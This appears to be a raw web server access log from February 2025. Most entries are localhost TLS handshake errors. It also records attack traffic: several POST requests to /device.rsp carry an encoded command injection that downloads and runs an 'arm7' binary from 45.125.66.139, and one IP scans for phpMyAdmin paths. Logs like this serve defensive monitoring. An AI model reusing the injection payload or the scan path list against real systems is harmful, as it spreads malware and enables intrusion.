127.0.0.1 - - [19/Feb/2025:19:22:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:22:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:19:22:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:22:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:22:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:22:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:31:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:31:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:32:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:19:32:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:32:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:32:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:19:32:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:19:32:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:32:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:32:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:32:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:32:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:32:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:32:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:32:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:32:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:32:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:32:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:41:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:19:41:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:41:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:41:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:42:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:42:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:19:42:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:42:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:42:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:42:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:42:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:42:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:42:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:42:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:42:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:42:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:42:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:42:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
91.224.92.10 - - [19/Feb/2025:19:47:51 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
127.0.0.1 - - [19/Feb/2025:19:51:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:51:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:51:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:51:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:52:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:52:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:52:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:52:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:52:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:52:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:52:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:52:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:52:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:52:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:52:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:19:52:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:52:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:19:52:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
92.246.87.21 - - [19/Feb/2025:19:53:20 +0300] "GET / HTTP/1.1" 200 18044
91.224.92.10 - - [19/Feb/2025:19:55:01 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
46.19.143.10 - - [19/Feb/2025:19:55:21 +0300] "GET / HTTP/1.1" 200 18044
87.121.84.7 - - [19/Feb/2025:19:55:43 +0300] "GET / HTTP/1.1" 200 18044
91.224.92.10 - - [19/Feb/2025:19:55:54 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
193.68.89.10 - - [19/Feb/2025:19:58:44 +0300] "GET / HTTP/1.1" 200 18044
80.82.156.184 - - [19/Feb/2025:20:01:30 +0300] "GET /db/webdb/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:31 +0300] "GET /pma/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:31 +0300] "GET /sql/sqladmin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:31 +0300] "GET /phpMyAdmin-latest-all-languages/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:31 +0300] "GET /phpmyadmin2022/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:31 +0300] "GET /db/phpMyAdmin3/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:31 +0300] "GET /database/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:31 +0300] "GET /phpMyAdmin-5.1.3/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:31 +0300] "GET /phpmyadmin3/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:32 +0300] "GET /program/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:32 +0300] "GET /index.php?lang=en HTTP/1.1" 200 818
80.82.156.184 - - [19/Feb/2025:20:01:32 +0300] "GET /phpMyAdmin5/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:32 +0300] "GET /db/db-admin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:32 +0300] "GET /phpMyAdmin-5/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:32 +0300] "GET /sql/sql-admin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:32 +0300] "GET /phpMyadmin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:33 +0300] "GET /phpmyadmin2019/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:33 +0300] "GET /phpmyadmin6/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:33 +0300] "GET /phpMyAdmin-3/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:33 +0300] "GET /administrator/db/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:33 +0300] "GET /phpMyAdmin-5.2/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:33 +0300] "GET /db/phpMyAdmin-4/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:33 +0300] "GET /phpMyAdmin-latest-english/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:33 +0300] "GET /db/myadmin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:34 +0300] "GET /phpMyAdmin2/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:34 +0300] "GET /phpMyAdmin5.2/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:34 +0300] "GET /phpmyadmin2/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:34 +0300] "GET /mysql/pMA/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:34 +0300] "GET /phpMyAdmin1/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:34 +0300] "GET /db/websql/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:34 +0300] "GET /mysql/pma/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:34 +0300] "GET /php-myadmin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:35 +0300] "GET /phpMyAdmin-5.2.1/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:35 +0300] "GET /sql/sqlweb/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:35 +0300] "GET /phpMyAdmin-5.1.0/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:35 +0300] "GET /_phpmyadmin_/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:35 +0300] "GET /admin/db/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:35 +0300] "GET /db/phpMyAdmin-3/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:35 +0300] "GET /db/phpMyAdmin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:36 +0300] "GET /MyAdmin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:36 +0300] "GET /phpMyAdmin-4.9.10-all-languages/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:36 +0300] "GET /db/phpMyAdmin-5/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:36 +0300] "GET /phpMyAdmin-5.1.1/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:36 +0300] "GET /_phpMyAdmin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:36 +0300] "GET /admin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:36 +0300] "GET /db/dbweb/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:36 +0300] "GET /db/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:37 +0300] "GET /PMA/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:37 +0300] "GET /phpMyAdmin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:37 +0300] "GET /sql/webdb/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:37 +0300] "GET /admin/pma/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:37 +0300] "GET /phpmyadmin_/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:37 +0300] "GET /phpMyAdmin-5.2.0-all-languages/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:37 +0300] "GET /administrator/web/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:37 +0300] "GET /phpmy/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:38 +0300] "GET /admin/sysadmin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:38 +0300] "GET /db/phpmyadmin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:38 +0300] "GET /mysql/admin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:38 +0300] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:38 +0300] "GET /administrator/phpmyadmin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:38 +0300] "GET /php-my-admin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:38 +0300] "GET /mysql/mysqlmanager/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:38 +0300] "GET /administrator/admin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:39 +0300] "GET /sql/phpmyadmin5/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:39 +0300] "GET /phpmyadmin2018/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:39 +0300] "GET /sql/webadmin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:39 +0300] "GET /phpmy-admin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:39 +0300] "GET /phpMyAdmin-4.9.7/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:39 +0300] "GET /phpMyAdmin-4/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:39 +0300] "GET /phpMyAdmin-5.1.2/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:40 +0300] "GET /phpMyAdmin5.1/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:40 +0300] "GET /admin/sqladmin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:40 +0300] "GET /dbadmin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:40 +0300] "GET /phpmyadmin2021/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:40 +0300] "GET /sql/websql/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:40 +0300] "GET /mysqlmanager/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:40 +0300] "GET /db/dbadmin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:40 +0300] "GET /admin/phpmyadmin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:41 +0300] "GET /2phpmyadmin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:41 +0300] "GET /shopdb/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:41 +0300] "GET /db/phpmyadmin5/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:41 +0300] "GET /phpMyAdmin6/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:41 +0300] "GET /mysqladmin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:41 +0300] "GET /_phpmyadmin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:41 +0300] "GET /phpmyadmin4/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:41 +0300] "GET /sqlmanager/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:42 +0300] "GET /mysql/sqlmanager/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:42 +0300] "GET /phpMyAdmin6.0/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:42 +0300] "GET /sql/phpmy-admin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:42 +0300] "GET /phpMyAdmin3/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:42 +0300] "GET /sql/sql/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:42 +0300] "GET /administrator/pma/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:42 +0300] "GET /mysql/dbadmin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:42 +0300] "GET /phpMyAdmin-latest/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:43 +0300] "GET /sql/php-myadmin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:43 +0300] "GET /phpmyadmin2020/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:43 +0300] "GET /sql/phpmyadmin4/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:43 +0300] "GET /mysql/db/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:43 +0300] "GET /admin/phpMyAdmin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:43 +0300] "GET /phppma/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:43 +0300] "GET /phpMyAdmin-5.2.0/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:44 +0300] "GET /phpMyAdmin_/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:44 +0300] "GET /db/phpmyadmin3/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:44 +0300] "GET /mysql-admin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:44 +0300] "GET /mysql/web/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:44 +0300] "GET /administrator/phpMyAdmin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:44 +0300] "GET /phpMyAdmin-5.2.1-english/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:44 +0300] "GET /phpmyadmin2017/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:44 +0300] "GET /administrator/PMA/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:45 +0300] "GET /mysql/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:45 +0300] "GET /__phpmyadmin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:45 +0300] "GET /db/phpmyadmin4/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:45 +0300] "GET /1phpmyadmin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:45 +0300] "GET /admin/web/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:45 +0300] "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:45 +0300] "GET /phpmyAdmin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:45 +0300] "GET /phpMyAdmin-5.2.1-all-languages/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:46 +0300] "GET /sql/phpmanager/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:46 +0300] "GET /myadmin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:46 +0300] "GET /sql/myadmin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:46 +0300] "GET /phpmyadmin5/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:46 +0300] "GET /sql/phpMyAdmin2/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:46 +0300] "GET /sql/phpMyAdmin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:46 +0300] "GET /db/webadmin/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:46 +0300] "GET /sql/phpmyadmin3/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:47 +0300] "GET /phpmyadmin1/index.php?lang=en HTTP/1.1" 404 196
80.82.156.184 - - [19/Feb/2025:20:01:47 +0300] "GET /phpMyAdmin4/index.php?lang=en HTTP/1.1" 404 196
127.0.0.1 - - [19/Feb/2025:20:01:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:01:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:01:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:20:01:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:02:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:02:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:02:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:02:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:02:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:02:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:02:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:02:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:02:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:02:53 +0300] "\x16\x03\x01\x07" 400 226
127.0.0.1 - - [19/Feb/2025:20:02:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:02:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:02:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:02:53 +0300] "\x16\x03\x01\x06\xa0\x01" 400 226
91.224.92.10 - - [19/Feb/2025:20:03:52 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
91.224.92.10 - - [19/Feb/2025:20:09:49 +0300] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20arm7%3B%20wget%20http%3A%2F%2F45.125.66.139%2Farm7%3B%20chmod%20777%20%2A%3B%20.%2Farm7%20tbk HTTP/1.1" 404 196
127.0.0.1 - - [19/Feb/2025:20:11:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:11:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:11:53 +0300] "\x16\x03\x01\x06\xe0\x01" 400 226
127.0.0.1 - - [19/Feb/2025:20:11:53 +0300] "\x16\x03\x01\x06\xc0\x01" 400 226
